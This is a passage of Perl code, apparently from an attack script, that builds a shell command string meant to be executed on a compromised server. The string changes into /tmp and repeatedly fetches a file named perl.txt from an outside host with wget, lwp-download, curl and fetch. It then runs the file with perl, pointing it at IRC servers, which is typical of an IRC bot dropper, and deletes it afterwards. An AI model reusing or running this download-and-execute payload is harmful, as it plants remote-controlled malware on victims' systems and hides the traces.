    my $url = $_[0];
    my $code = "cd /tmp;wget http://3dyorking.com/zencart/perl.txt;perl perl.txt irc.telkom.name;lwp-download http://3dyorking.com/zencart/perl.txt;perl perl.txt irc.ds.my;curl -O http://3dyorking.com/zencart/perl.txt;perl perl.txt irc.telkom.name;fetch http://3dyorking.com/zencart/perl.txt;perl perl.txt irc.telkom.name;chmod 755 perl.txt;perl perl.txt irc.telkom.name;rm -fr perl.txt";
